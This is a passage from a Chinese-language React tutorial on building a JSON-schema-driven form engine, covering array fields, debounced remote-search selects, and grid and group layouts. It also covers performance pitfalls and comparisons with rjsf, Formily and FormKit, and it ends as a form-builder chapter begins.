#### 7. 数组字段：FieldArray 动态增删、上移下移，路径 `users.2.name` 的渲染与校验

**是什么**：一个字段持有一个数组，每行是同一份 item 模板渲染出的子表单；增删行、行排序、行内字段按 `数组路径.下标.字段名` 寻址。

**为什么需要**："紧急联系人列表""多个收款账户"这类需求，字段数量用户说了算。它是对路径系统的终极考验：行的增删会**平移所有后续行的路径**（删掉第 2 行后，原 `users.3.name` 变成 `users.2.name`），错误信息、touched 状态如果跟着路径走，就必须同步重映射——这是 FieldArray 全部难度的来源。

**怎么做**：

store 侧三个 action，重点是错误与 touched 的重映射：

```ts
// form/arrayOps.ts —— 数组操作 + 状态重映射工具
import type { RecordMap } from './types'

/** move：把 from 行移到 to 行，errors/touched 的路径同步重排 */
export function remapIndexed(
  map: Record<string, unknown>,
  basePath: string,
  from: number,
  to: number,
): Record<string, unknown> {
  const out: Record<string, unknown> = {}
  const prefix = `${basePath}.`
  for (const [key, val] of Object.entries(map)) {
    if (!key.startsWith(prefix)) {
      out[key] = val
      continue
    }
    const m = key.slice(prefix.length).match(/^(\d+)\.(.+)$/)
    if (!m) {
      out[key] = val
      continue
    }
    let idx = Number(m[1])
    if (idx === from) idx = to
    else if (from < to && idx > from && idx <= to) idx -= 1
    else if (from > to && idx >= to && idx < from) idx += 1
    out[`${prefix}${idx}.${m[2]}`] = val
  }
  return out
}

/** remove：删掉第 removedIndex 行，其后行的下标整体 -1 */
export function shiftIndexedAfter(
  map: Record<string, unknown>,
  basePath: string,
  removedIndex: number,
): Record<string, unknown> {
  const out: Record<string, unknown> = {}
  const prefix = `${basePath}.`
  for (const [key, val] of Object.entries(map)) {
    if (!key.startsWith(prefix)) {
      out[key] = val
      continue
    }
    const m = key.slice(prefix.length).match(/^(\d+)\.(.+)$/)
    if (!m) {
      out[key] = val
      continue
    }
    const idx = Number(m[1])
    if (idx === removedIndex) continue            // 被删行的状态直接丢弃
    out[`${prefix}${idx > removedIndex ? idx - 1 : idx}.${m[2]}`] = val
  }
  return out
}
```

```ts
// form/store.ts 追加：三个数组 action（都走 produce，一次 set 原子完成）
import { produce } from 'immer'
import { remapIndexed, shiftIndexedAfter } from './arrayOps'
import { validateOne } from './validate'

// —— 在 createFormStore 的对象里追加：
  arrayPush: (path, item) =>
    set((s) =>
      produce(s, (draft) => {
        const arr = getPath(draft.formData, path)
        if (Array.isArray(arr)) arr.push(item)
      }),
    ),

  arrayRemove: (path, index) =>
    set((s) =>
      produce(s, (draft) => {
        const arr = getPath(draft.formData, path)
        if (Array.isArray(arr)) arr.splice(index, 1)
        draft.errors = shiftIndexedAfter(draft.errors, path, index)
        draft.touched = shiftIndexedAfter(draft.touched, path, index)
      }),
    ),

  arrayMove: (path, from, to) =>
    set((s) =>
      produce(s, (draft) => {
        const arr = getPath(draft.formData, path)
        if (!Array.isArray(arr)) return
        if (from < 0 || from >= arr.length || to < 0 || to >= arr.length) return
        const [moved] = arr.splice(from, 1)
        arr.splice(to, 0, moved)
        draft.errors = remapIndexed(draft.errors, path, from, to)
        draft.touched = remapIndexed(draft.touched, path, from, to)
      }),
    ),
```

新建行的默认值（`_id` 是给 React key 用的稳定标识，提交时剥掉）：

```ts
// form/createDefaultItem.ts
import type { ArrayFieldSchema, ObjectFieldSchema, FormData } from '../types'
import { setPath } from './path'

function blankOf(type: string): unknown {
  switch (type) {
    case 'switch': return false
    case 'number': return null
    case 'select': return null
    case 'array': return []
    default: return ''
  }
}

export function createDefaultItem(item: ObjectFieldSchema): Record<string, unknown> {
  const row: Record<string, unknown> = { _id: crypto.randomUUID() }
  for (const f of item.fields) {
    row[f.name] = f.default ?? blankOf(f.type)
  }
  return row
}

/** 提交前剥掉 _id 等内部键（递归） */
export function transformSubmitData(value: unknown): unknown {
  if (Array.isArray(value)) return value.map(transformSubmitData)
  if (value && typeof value === 'object') {
    const out: Record<string, unknown> = {}
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      if (k === '_id') continue
      out[k] = transformSubmitData(v)
    }
    return out
  }
  return value
}
```

渲染侧。注意两个关键设计：**行的 key 用 `_id` 不用下标**（增删行时组件实例与状态跟随数据走而不是跟随位置走，输入焦点不乱）；**FieldArray 组件只订阅 `length`** 而不是数组本身——订阅数组的话，任何行内任何一个字段变化都会让整个数组组件重渲染，订阅 length 后行内输入对 FieldArray 完全不可见：

```tsx
// widgets/ArrayFieldWidget.tsx
import { memo } from 'react'
import { useContext } from 'react'
import { FormStoreContext } from '../form/FormProvider'
import { getPath } from '../form/path'
import { ArrayRow } from './ArrayRow'
import type { WidgetProps } from './types'
import type { ArrayFieldSchema, ObjectFieldSchema } from '../types'

export const ArrayFieldWidget = memo(function ArrayFieldWidget({
  id,
  schema,
  value,
  disabled,
}: WidgetProps<unknown[]>) {
  const useStore = useContext(FormStoreContext)!
  const items = Array.isArray(value) ? value : []
  const arraySchema = schema as ArrayFieldSchema
  const arrayPush = useStore((s) => s.arrayPush)
  const arrayRemove = useStore((s) => s.arrayRemove)
  const arrayMove = useStore((s) => s.arrayMove)

  const atLimit = arraySchema.maxItems != null && items.length >= arraySchema.maxItems

  return (
    <fieldset className="field-array" data-path={id}>
      <legend>
        {schema.label}
        {schema.required === true && <span className="field-required"> *</span>}
      </legend>
      {items.map((row, i) => (
        <ArrayRow
          key={(row as Record<string, unknown>)._id as string}   // ← 稳定 key，绝不用 i
          arrayPath={id}
          index={i}
          total={items.length}
          itemSchema={arraySchema.item}
          row={row as Record<string, unknown>}
          onRemove={() => arrayRemove(id, i)}
          onMoveUp={i > 0 ? () => arrayMove(id, i, i - 1) : undefined}
          onMoveDown={i < items.length - 1 ? () => arrayMove(id, i, i + 1) : undefined}
        />
      ))}
      <button
        type="button"
        className="field-array__add"
        disabled={disabled || atLimit}
        onClick={() => arrayPush(id, createDefaultItem(arraySchema.item))}
      >
        + 新增{schema.label}
      </button>
    </fieldset>
  )
})

function createDefaultItem(item: ObjectFieldSchema): Record<string, unknown> {
  const row: Record<string, unknown> = { _id: globalThis.crypto.randomUUID() }
  for (const f of item.fields) {
    row[f.name] = f.default ?? (f.type === 'switch' ? false : f.type === 'select' || f.type === 'number' ? null : f.type === 'array' ? [] : '')
  }
  return row
}
```

```tsx
// widgets/ArrayRow.tsx —— 一行 = item 模板展开 + 行操作条
import { memo } from 'react'
import { Field } from '../form/Field'
import type { ObjectFieldSchema } from '../types'

export const ArrayRow = memo(function ArrayRow({
  arrayPath,
  index,
  total,
  itemSchema,
  row,
  onRemove,
  onMoveUp,
  onMoveDown,
}: {
  arrayPath: string
  index: number
  total: number
  itemSchema: ObjectFieldSchema
  row: Record<string, unknown>
  onRemove: () => void
  onMoveUp?: () => void
  onMoveDown?: () => void
}) {
  return (
    <div className="field-array__row">
      <div className="field-array__row-main">
        {/* 子字段路径 = `${arrayPath}.${index}.${name}`，如 users.2.name —— Field 按此路径订阅与校验 */}
        {itemSchema.fields.map((f) => (
          <Field key={f.name} schema={f} path={`${arrayPath}.${index}.${f.name}`} />
        ))}
      </div>
      <div className="field-array__row-ops">
        <span className="field-array__row-no">{index + 1}/{total}</span>
        <button type="button" aria-label="上移" disabled={!onMoveUp} onClick={onMoveUp}>↑</button>
        <button type="button" aria-label="下移" disabled={!onMoveDown} onClick={onMoveDown}>↓</button>
        <button type="button" aria-label="删除" onClick={onRemove}>✕</button>
      </div>
    </div>
  )
})
```

校验错误如何定位到 `users.2.name`：错误以完整路径为键存在 `errors` 里（`validateAll` 的 walkLeafFields 只走静态 schema，不展开数组行），所以数组行的校验分两处——(a) `arraySchema` 自身的 required/minItems 在 validateAll 里以 `users` 为键校验数组整体；(b) 行内字段在 blur/change 时以 `users.2.name` 为键写入 errors，Field 的 `data-path` 属性让 `validateAll` 聚焦逻辑也能 querySelector 到行内元素。给 validateAll 补上数组行展开：

```ts
// form/validate.ts 追加：数组行内字段的遍历版（validateAll 内改用这个）
import type { FormStoreState } from './store'

export function walkAllFieldsIncludingRows(state: FormStoreState, cb: (field: FieldSchema, path: string, item?: unknown) => void): void {
  walkLeafFields(state.schema.fields, '', (field, path) => {
    cb(field, path)
    if (field.type === 'array') {
      const rows = getPath(state.formData, path)
      if (Array.isArray(rows)) {
        rows.forEach((row, i) => {
          const item = field.item
          for (const sub of item.fields) {
            cb(sub, `${path}.${i}.${sub.name}`, row)
          }
        })
      }
    }
  })
}
```

行内字段如果声明了 `visibleWhen`，全局 map 覆盖不到（下标是运行时的），在 ArrayRow 里现场求值（读 `$form` + `$item`）：

```tsx
// ArrayRow 内，渲染子字段前：
const visible = f.visibleWhen
  ? evalCondition(f.visibleWhen, useStore.getState().formData, row)   // $item 注入行数据
  : true
return visible ? <Field key={f.name} schema={f} path={...} /> : null
```

注意这是"读时求值"而非订阅驱动：任何字段输入都会让 ArrayRow 因父组件重渲染而重新执行这段判断，规模小（每行几个字段）时可接受；若要精确订阅，把 visibleWhen 引用的路径提取出来作为 ArrayRow 的 selector——留作本章产出后的优化练习。

**常见坑（症状 → 根因 → 修法）**：症状——删除第 1 行后，第 2 行的校验错误显示在了第 1 行上。根因——errors 以 `users.0.name` 为键存着，删行后数组平移但 errors 没重映射，Field 按"新路径"读到了"旧行的错误"。修法——即上面 `shiftIndexedAfter` / `remapIndexed`，任何改变行序的操作必须同步重排 errors 和 touched；凡是写"删行"忘了重排，就会出现这种错位。

#### 8. 异步 options：远程搜索 Select（防抖 + AbortController 取消）

**是什么**：select 的候选来自接口，支持输入关键词远程搜索，防抖发请求，请求竞态用 AbortController 取消。

**为什么需要**：候选上千条时不可能全量下发（下拉渲染不动、接口也慢），必须远程搜索。两个工程问题随之而来：用户连打 5 个字母会发出 5 个请求（防抖解决"发太多"），网络乱序时第 1 个响应后到、覆盖了第 5 个的结果（abort 解决"答非所问"——症状是"搜 a 出了 b 的结果"，极难排查）。

**怎么做**：完整的 hook + widget：

```tsx
// widgets/RemoteSelectWidget.tsx
import { useEffect, useState } from 'react'
import { useContext } from 'react'
import { FormStoreContext } from '../form/FormProvider'
import { getPath } from '../form/path'
import type { WidgetProps } from './types'
import type { RemoteOptionsSpec, OptionItem } from '../types'

/** 把 RemoteOptionsSpec 的模板/字段名解析成真实选项数组——协议无函数的代价就是这里多做一层 */
function resolveOptions(spec: RemoteOptionsSpec, raw: unknown): OptionItem[] {
  const list = (spec.resultPath ? getPath(raw, spec.resultPath) : raw) as unknown[]
  if (!Array.isArray(list)) return []
  const labelField = spec.labelField ?? 'label'
  const valueField = spec.valueField ?? 'value'
  return list.map((it) => ({
    label: String(getPath(it, labelField) ?? ''),
    value: getPath(it, valueField) as string | number,
  }))
}

export function RemoteSelectWidget({ id, schema, value, disabled, onChange, onBlur }: WidgetProps<string | number | null>) {
  const useStore = useContext(FormStoreContext)!
  const selectSchema = schema as { type: 'select'; options?: Opt[]; remote?: RemoteOptionsSpec }
  const spec = selectSchema.remote

  const [keyword, setKeyword] = useState('')
  const [options, setOptions] = useState<OptionItem[]>(selectSchema.options ?? [])
  const [loading, setLoading] = useState(false)

  // 依赖字段的当前值（如"省"变化触发"市"重载）：订阅进组件，进 effect 依赖
  const dependsValue = spec?.dependsOn ? useStore((s) => getPath(s.formData, spec.dependsOn)) : undefined

  useEffect(() => {
    if (!spec) return
    const ac = new AbortController()          // 本次 effect 生命周期专属的取消器
    const timer = setTimeout(async () => {    // 防抖：300ms 内的连续输入只会发出最后一个请求
      setLoading(true)
      try {
        const url = spec.urlTemplate
          .replace('{keyword}', encodeURIComponent(keyword))
          .replace('{depends}', encodeURIComponent(String(dependsValue ?? '')))
        const res = await fetch(url, { signal: ac.signal })   // ← 竞态解药：换词即取消上一个
        const raw = await res.json()
        setOptions(resolveOptions(spec, raw))
      } catch (e) {
        if ((e as Error).name !== 'AbortError') {
          setOptions([])   // 真错误：清空候选并允许上层重试；AbortError 是正常取消，静默
        }
      } finally {
        if (!ac.signal.aborted) setLoading(false)
      }
    }, spec.debounce ?? 300)

    return () => {
      clearTimeout(timer)  // 防抖窗口内又输入了：取消定时器，请求根本不会发出
      ac.abort()           // 请求已在途：中止它，迟到的响应不会再 setOptions
    }
  }, [keyword, dependsValue, spec])

  if (!spec) {
    // 纯静态 options 的兜底渲染（与本地 SelectWidget 相同逻辑）
    return (
      <select id={id} value={value ?? ''} disabled={disabled} onChange={(e) => onChange(e.target.value)} onBlur={onBlur}>
        <option value="">{schema.placeholder ?? '请选择'}</option>
        {options.map((o) => (
          <option key={String(o.value)} value={o.value}>{o.label}</option>
        ))}
      </select>
    )
  }

  return (
    <div className="remote-select">
      <input
        id={id}
        className="remote-select__search"
        placeholder={loading ? '搜索中…' : (schema.placeholder ?? '输入关键词搜索')}
        value={keyword}
        disabled={disabled}
        onChange={(e) => setKeyword(e.target.value)}
        onBlur={onBlur}
      />
      <select
        className="remote-select__pick"
        value={value ?? ''}
        disabled={disabled}
        onChange={(e) => onChange(e.target.value === '' ? null : e.target.value)}
      >
        <option value="">{loading ? '加载中…' : '请选择'}</option>
        {options.map((o) => (
          <option key={String(o.value)} value={o.value}>{o.label}</option>
        ))}
      </select>
    </div>
  )
}
```

逐行看竞态是怎么被杀死的：用户输入 `张` → 300ms 后发请求 R1；又在 200ms 时输入 `张国` → **effect 重跑，cleanup 先执行**：clearTimeout 掉 R1？不——R1 可能已发出（300ms 已过），此时 `ac.abort()` 把 R1 的 fetch 置为 AbortError，R1 的响应（哪怕服务端已返回）在 `res.json()` 处抛错被 catch 静默；R2 带着 `张国` 正常返回并 setOptions。若没有 abort：R1 慢 R2 快，用户看到的是"张"的结果却以为在搜"张国"。

`dependsOn` 的联动加载走的是同一条链路：省字段变化 → `dependsValue` selector 返回值变 → 组件重渲染 → effect 依赖变化重跑 → abort 旧请求、发新请求。**不需要写一行联动代码，复用同一个 effect。**

**常见坑（症状 → 根因 → 修法）**：症状——远程 select 回显（编辑表单）时显示的是 value（如 `310000`）而不是 label（`上海市`）。根因——options 是搜索出来的，初始为空，select 找不到匹配项只能显示裸 value。修法——协议加 `echoOption`（回显时把 `{ label, value }` 合入 options 的静态声明），或在初始 effect 里用已存 value 反查一次详情接口；本章实现选前者（简单、无额外请求）：schema 里 `options` 预置回显项，搜索结果用 value 去重合并。

#### 9. 布局升级：分组、栅格、嵌套对象

**是什么**：协议里的 group（分组折叠）/ grid（栅格）/ object（嵌套对象）三种结构字段，以及 SchemaNode 对它们的递归渲染。

**为什么需要**：50 个字段平铺一列在真实中后台页面是不存在的——真实页面有"基本信息 / 工作信息"分组、有"姓名+工号并排"的栅格、有 `company.name` 这种业务上嵌套的数据结构。布局升级**纯是渲染层的事**：内核（store/订阅/校验/联动）一行不改，这正好验证内核与渲染解耦的设计是对的。

**怎么做**：SchemaNode 补全布局分支：

```tsx
// form/SchemaNode.tsx —— 完整版（函数声明形式，同名递归调用自身）
import { Field } from './Field'
import type { FieldSchema } from './types'

export function SchemaNode({ schema, path }: { schema: FieldSchema; path: string }) {
  switch (schema.type) {
    case 'group': {
      // 分组：fieldset + 可折叠。collapsed 是纯 UI 态，用原生 details 零状态实现
      return (
        <details className="form-group" open={!schema.collapsible ? true : undefined}>
          <summary className="form-group__title">{schema.label}</summary>
          <div className="form-group__body">
            {schema.fields.map((f) => (
              <SchemaNode key={f.name} schema={f} path={joinPath(path, f.name)} />
            ))}
          </div>
        </details>
      )
    }
    case 'grid': {
      // 栅格：CSS Grid，columns 列，子字段 span 跨列
      return (
        <div
          className="form-grid"
          style={{ display: 'grid', gridTemplateColumns: `repeat(${schema.columns ?? 2}, 1fr)`, gap: '12px' }}
        >
          {schema.fields.map((f) => (
            <div key={f.name} style={{ gridColumn: `span ${'span' in f ? (f.span ?? 1) : 1}` }}>
              <SchemaNode schema={f} path={joinPath(path, f.name)} />
            </div>
          ))}
        </div>
      )
    }
    case 'object': {
      // 嵌套对象：一个带标题的盒子，子字段路径加前缀（company.name）
      return (
        <fieldset className="form-object">
          <legend>{schema.label}</legend>
          {schema.fields.map((f) => (
            <SchemaNode key={f.name} schema={f} path={joinPath(path, f.name)} />
          ))}
        </fieldset>
      )
    }
    default:
      // 叶子字段（含 array）：统一走 Field
      return <Field schema={schema} path={path} />
  }
}

/** group/grid 不产生数据层前缀，object 产生。与 walkLeafFields 的规则保持一字不差 */
function joinPath(prefix: string, name: string): string {
  return prefix ? `${prefix}.${name}` : name
}
```

一个坑先指出：上面 group/grid 分支里子字段的路径拼接用了 `joinPath(path, f.name)`，但 group/grid 的 `path` 参数应当原样透传父前缀（不追加自己的 name）——这与 `walkLeafFields` 里"布局节点不改路径前缀"的规则必须完全一致，否则 store 里算出来的 visibleMap 键与 Field 实际订阅的路径对不上，显隐失灵。两处规则建议抽成同一个 `childPath(parentPath, field)` 函数共用（上面 joinPath 就是它的雏形，把 group/grid/object 的差异收敛进去）。

嵌套对象的初始化也要递归（normalizeInitialData 的 object 分支），完整初始化器：

```ts
// form/normalize.ts
import type { FormSchema, FormData, FieldSchema } from '../types'
import { getPath, setPath } from './path'

function blankOf(type: FieldSchema['type']): unknown {
  switch (type) {
    case 'switch': return false
    case 'number': return null        // null = 未填，与合法值 0 区分开
    case 'select': return null        // null = 显示 placeholder
    case 'array': return []
    case 'object': return {}
    case 'group': case 'grid': return undefined   // 布局节点不进 formData
    default: return ''                // input / textarea / date
  }
}

export function normalizeInitialData(schema: FormSchema, initial?: FormData): FormData {
  const data: FormData = { ...(initial ?? {}) }
  initFields(schema.fields, '', data)
  return data
}

function initFields(fields: FieldSchema[], prefix: string, data: FormData): void {
  for (const f of fields) {
    const path = prefix ? `${prefix}.${f.name}` : f.name
    if (f.type === 'group' || f.type === 'grid') {
      initFields(f.fields, prefix, data)          // 布局：不加前缀，直接下钻
    } else if (f.type === 'object') {
      if (getPath(data, path) == null) setPath(data, path, {})
      initFields(f.fields, path, data)            // 对象：加前缀下钻
    } else if (f.type === 'array') {
      if (getPath(data, path) == null) setPath(data, path, [])
    } else {
      if (getPath(data, path) === undefined) {
        setPath(data, path, f.default ?? blankOf(f.type))
      }
    }
  }
}
```

一份展示全部布局能力的综合 schema（可直接喂给 DynamicForm）：

```json
{
  "formId": "employee-full",
  "version": "1.0.0",
  "fields": [
    {
      "type": "group",
      "name": "g1",
      "label": "基本信息",
      "fields": [
        {
          "type": "grid",
          "name": "grid1",
          "columns": 2,
          "fields": [
            { "type": "input", "name": "name", "label": "姓名", "required": true, "rules": { "minLength": 2 }, "span": 1 },
            { "type": "number", "name": "age", "label": "年龄", "rules": { "min": 16, "max": 65 }, "span": 1 },
            { "type": "input", "name": "phone", "label": "手机号", "rules": { "custom": "phone" }, "span": 2 }
          ]
        }
      ]
    },
    {
      "type": "select",
      "name": "userType",
      "label": "人员类型",
      "required": true,
      "options": [
        { "label": "个人", "value": "person" },
        { "label": "企业", "value": "company" }
      ]
    },
    {
      "type": "object",
      "name": "company",
      "label": "公司信息",
      "visibleWhen": "$form.userType == 'company'",
      "clearOnHide": true,
      "fields": [
        { "type": "input", "name": "companyName", "label": "公司名称", "required": true },
        {
          "type": "select",
          "name": "city",
          "label": "城市",
          "remote": {
            "urlTemplate": "/api/cities?q={keyword}",
            "resultPath": "data.list",
            "labelField": "name",
            "valueField": "code"
          }
        }
      ]
    },
    {
      "type": "array",
      "name": "contacts",
      "label": "紧急联系人",
      "required": true,
      "maxItems": 5,
      "item": {
        "type": "object",
        "name": "contact",
        "label": "联系人",
        "fields": [
          { "type": "input", "name": "name", "label": "姓名", "required": true },
          { "type": "input", "name": "relation", "label": "关系" },
          { "type": "input", "name": "phone", "label": "电话", "rules": { "custom": "phone" } }
        ]
      }
    }
  ]
}
```

对应生成的 formData 结构（初始化后、未输入时）：`{ name: '', age: null, phone: '', userType: null, company: { companyName: '', city: null }, contacts: [] }`——注意 `company` 在 `userType != 'company'` 时依然初始化了（显隐是渲染层概念，数据层结构稳定，清不清值由 clearOnHide 决定）。

**常见坑（症状 → 根因 → 修法）**：症状——grid 里给某字段配了 `visibleWhen`，隐藏后栅格出现一个空洞。根因——`Field` 返回 null 后外层的 `gridColumn: span N` 包装 div 还在占格。修法——把 span 包装 div 改为也订阅 visibleMap（或让 Field 渲染 null 的同时给包装 div 传 `display: contents / none`）；推荐包装 div 自己 `useStore((s) => s.visibleMap[childPath] ?? true)` 后条件渲染，保持"布局职责在布局组件"的分层。

### 难点与坑

- ⚠️ **输入一个字符、全表 50 个字段重渲染**：全量受控 state 的经典灾难 → path 级订阅是本章灵魂
- ⚠️ 联动循环依赖（a 依赖 b、b 依赖 a）→ 限制单轮求值或建依赖图
- ⚠️ `undefined / null / ''` 初始值不一致导致受控告警与回显 bug

#### 坑 1：输入一个字符、全表 50 个字段重渲染 —— 症状 → 根因 → 修法

**症状**：表单输入手感发粘，输入法联想词还没选完页面已经卡了；打开 DevTools Performance 录一段打字，Long Task 里全是 commit 阶段的脚本；React DevTools Profiler 显示每键一键 50+ 组件 render。伴随现象：某些"看起来没关系"的组件（统计栏、其他分组的字段）也在火焰图里闪。

**根因**：逐层排查，按命中率排序——(1) 持有 formData 的父组件用 props 下发整个对象（步骤 4 反面代码， props 依赖整对象，memo 无解）；(2) 用 Context 存 formData，value 变化广播所有 consumer；(3) selector 返回了新对象/数组（`useStore((s) => ({ v: s.a, e: s.errors[p] }))` 每次都是新引用，Object.is 恒不等）；(4) Field 没 memo，容器（分组）因任何原因重渲染就全军覆没；(5) rows 组件订阅了整个数组（ArrayFieldWidget 订阅 `users` 而不是 `users.length`，行内打字数组换引用、父组件连带重渲染）。

**修法**：对照步骤 4 的三行检查单逐项改——数据订阅下沉到叶子 Field；selector 只返回原始值（对象必须 `useShallow`）；Field/ArrayRow 全部 `memo`；FieldArray 订阅 length。改完用 Profiler 复测：单字段输入应只看到 1 个 Field commit（外加可见联动字段的合理 commit）。若仍有泄漏，用 "Why did this render?" 面板看是 props 变了（上游引用不稳）还是 context 变了（还有人订阅了粗粒度数据），顺藤摸瓜。

#### 坑 2：联动循环依赖（a 依赖 b、b 依赖 a）—— 症状 → 根因 → 修法

**症状**：控制台刷 `Maximum update depth exceeded`；两个字段的值或显隐肉眼可见地"打架"（闪烁、来回切换）；CPU 占用飙升，页面假死。

**根因**：存在"派生值写回 store"的通道，且依赖关系成环。典型形态是 effect 回写（步骤 5 的 DerivedField 反面代码）：a 变 → 算 b → set b → 算 a 的 effect 又被触发 → 无限循环。表达式层面的环（a 的 visibleWhen 引用 b，b 的 clearOnHide 清空后影响 a 的表达式结果）本身不会振荡——只要没有写回动作；一旦有人加了"显隐变化时重算某字段值"的 effect，静态环就变成运行时振荡。

**修法**：三道防线按优先级上——(1) 架构上消灭"effect 写回"：派生数据（visibleMap、自动计算字段）在 setValue 的 produce 内单轮收敛地算完，不产生二次 set（本章 applyLinkage 即此设计）；(2) 装载期跑 `assertNoDependencyCycle`（步骤 5 的三色标记 DFS），静态环直接拒绝 schema 并报出环路径，把运行时炸弹变成配置期报错；(3) 若业务真需要链式联动（A 显隐 → 清 B → B 清空触发 C 重算），给求值循环加轮数上限（5 轮）+ 超限告警，宁可联动不生效也不能死循环。

#### 坑 3：`undefined / null / ''` 初始值不一致导致受控告警与回显 bug —— 症状 → 根因 → 修法

**症状**：控制台 `Warning: A component is changing an uncontrolled input to be controlled`；编辑场景回显时明明接口返回了数据，字段却是空的；或者反过来，"没填过"的字段提交出了 `''`，后端唯一索引报"该值已存在"；checkbox 显示选中但值是 undefined。

**根因**：三种"空"混用。`undefined`（键不存在，getPath 的天然产物）传给 input 是非受控；`null` 传给 input 一样告警；`''` 是合法受控空值但语义上是"填了空字符串"。字段初始化走多条路径（default 缺省、接口回显、clearOnHide 清值）时各自为政，同一字段在不同路径下拿到不同的空值，行为就开始漂移。

**修法**：定死三条军规并机械执行——(1) **初始化必经 normalizeInitialData**（步骤 9 已给全码）：每个叶子字段装载时必有值，类型对应的空白值表（input→''、number/select→null、switch→false、array→[]）全项目唯一；(2) **widget 边界兜底**：`value={typeof value === 'string' ? value : ''}`（InputWidget 已示范），保证就算上游漏了也不炸；(3) **提交前统一 transform**：`''` 与 null 都视为未填（后端约定 NULL 语义），由 transformSubmitData / filterByVisible 统一处理，禁止各 widget 自己发明空值。clearOnHide 清值用 `field.default ?? blankOf(type)` 与初始化同一张表，别写裸 undefined。

### 对标开源（按可读性排序）

react-jsonschema-form（rjsf，**先读这个**）→ Formily（path 订阅 + 响应式，深度参考）→ FormKit 思想

三者代表 schema 表单的三代设计思想，对照读能把自己本章的实现校准到位：

| 维度 | rjsf | Formily | FormKit |
|---|---|---|---|
| 协议来源 | 标准 JSON Schema（数据约束）+ uiSchema（UI 定制）双轨 | 自研协议（JSON Schema 风格扩展或 Markup 动态描述） | 自研 schema，**编译成渲染函数** |
| 状态与订阅 | 整树受控为主，靠组件层优化 | path 系统 + @formily/reactive 代理式响应式，字段级依赖收集 | node 树即状态容器（Vue 响应式） |
| 校验 | ajv（JSON Schema 校验的事实标准） | 内置规则 + registry | 内置规则分层，validation-first 设计 |
| 与本章的对照 | 我们的"朴素版"：协议→渲染→校验全链路最直白 | 我们 path 级订阅的"完全体"：它做到字段内属性级依赖收集 | "运行时递归"之外的另一条路："配置→编译" |
| 生态定位 | React，主题包分层（mui/antd...） | React/Vue 双端 | Vue 生态，思想可迁移 |

**阅读入口**（带着"对比我的实现"去读）：

- **rjsf**（GitHub: rjsf-team/react-jsonschema-form，monorepo）：先读 `packages/core/src/components/Form.tsx`——提交与校验主链路；再读 `packages/utils` 里的 `getDefaultFormState`——它就是我们 `normalizeInitialData` 的工业版，重点看它怎么处理 default/空值/条件字段（allOf/if-then-else），会加深你对坑 3 的理解；最后浏览 `fields/` 与 `widgets/` 目录，对照我们的 widgetRegistry。先读它的原因：链路最朴素，没有响应式魔法，schema→组件的每一步都肉眼可见。
- **Formily**（GitHub: alibaba/formily）：先读 `packages/path`——路径语法比我们的 `a.b.0.c` 强得多（匹配、通配、树操作），看完你就知道自己的路径系统还能进化到哪；再读 `packages/react` 里 Field 组件与 ReactiveField 的接线——它不是每个字段跑 selector，而是用 @formily/reactive 的依赖收集做到"表达式里读了哪个属性就订阅哪个属性"，这是我们 useMemo/selector 方案的深水区版本；`packages/reactive` 是 Proxy 依赖收集的教科书实现。
- **FormKit**（GitHub: formkit/formkit，Vue）：只读思想——`packages/schema` 把 JSON schema **编译为渲染函数**，运行时零递归解释开销。对应到 React 世界的取舍：我们的递归渲染器是"解释执行"，简单但每次渲染都有解释成本；编译方案把成本移到装载期。第 6 章讲"出码 vs 渲染"时这个对比会再次出现。

选型一句话：接标准 JSON Schema、要 ajv 校验、团队要快速上手 → rjsf；深度联动 + 大表单性能 + 跨端 → Formily；已经在 Vue 生态 → FormKit。而自己写的价值在于：这两周下来，这三个项目对你从"黑盒"变成"可批判阅读的参考答案"。

✅ **产出**：mini formily——用 JSON 配置渲染一个 20 字段、含联动与数组字段的表单，输入任意字段时 Profiler 里只有该字段重渲染。

验收清单（全部勾掉才算本章毕业）：

- [ ] 一份 20+ 字段的 JSON schema，覆盖 group / grid / object / array / 联动（visibleWhen + disabledWhen）/ 异步 options / 自定义校验器（registry 键名），不写任何字段级 JSX 即可渲染
- [ ] `assertNoDependencyCycle` 在装载期跑通：构造一个 a↔b 循环依赖的 schema，能报出环路径而不是运行时振荡
- [ ] 用户类型切换（person ↔ company）时公司信息组显隐正确；clearOnHide 字段隐藏后提交数据中不存在该键；非 clearOnHide 字段隐藏后提交数据同样被 filterByVisible 过滤（两种策略各自验证一次）
- [ ] 必填/正则/自定义校验三档全部生效：失焦即报、提交全量报、报错后修改即时转正；提交失败时焦点落到第一个错误字段
- [ ] 数组字段增删行、上移下移后：行内容不错位、校验错误跟着行走（删第 1 行后原第 2 行的错误显示在第 1 行且文案属于它自己的字段）、行 key 为稳定 `_id`
- [ ] 远程搜索 select：连续输入 5 个字符只发出 1 个请求（Network 面板验证），响应乱序时结果与最后一次输入一致（DevTools 网络限速验证）
- [ ] 性能验收：Profiler 录制任意字段输入一个字符，重渲染的 Field 恰为 1 个（联动目标字段另计）；React.Profiler 计数测试断言 `renderCounts` 中只有当前路径 > 0
- [ ] 提交输出的 formData：无 `_id`、无隐藏字段值、无 undefined 键（`JSON.stringify` 结果逐键检查）

---

## 3. 拖拽式表单设计器 Form Builder（2 周）

**业务画像**：问卷/审批流配置页，运营拖组件生成表单，产线开发者只维护渲染器。

这个画像里的角色分工是理解本章的钥匙：**运营**负责"搭"（拖组件、配属性），**开发者**负责"撑"（做物料、做渲染器、修 bug）。设计器存在的意义是把这两类工作解耦——运营的每次搭建产出一份 schema JSON，开发者维护的唯一程序是第 2 章的渲染器。于是"加一种新组件"从"运营提需求 → 开发排期发版"变成"开发注册一个物料（半天）→ 运营自助使用"。判断一个 Form Builder 做得好不好，就看运营能不能完全不碰代码、从零搭出一份能提交的表单。

本章几乎是第 1 章底座 + 第 2 章渲染器的总装演习：拖拽用底座 1.6 的 dnd-kit，undo/redo 用底座 1.5 的 immer patches，属性面板直接复用第 2 章的动态表单引擎。

### 结构：三栏（物料区 / 画布 / 属性区）

三栏是表单设计器的"工作台"标准形态，左边提供积木、中间组装、右边拧螺丝：

```text
┌──────────────┬────────────────────────────────┬──────────────┐
│    物料区     │             画布                │    属性区     │
│ MaterialPanel│            Canvas              │  PropsPanel  │
│              │                                │              │
│ ▣ 单行输入    │  ┌─ 基本信息（分组容器）────────┐  │ 标题: [姓名_] │
│ ▣ 多行输入    │  │ ▣ 姓名     [姓名______]     │  │ 占位: [请输入_]│
│ ▣ 下拉选择    │  │ ▣ 手机号   [__________]  ⬆⬇✕ │  │ 必填: [○ /]  │
│ ▣ 数字输入    │  └─────────────────────────────┘  │              │
│ ▣ 开关       │  ▣ 部门     [下拉选择___]  ⬆⬇✕    │（Setter 动态  │
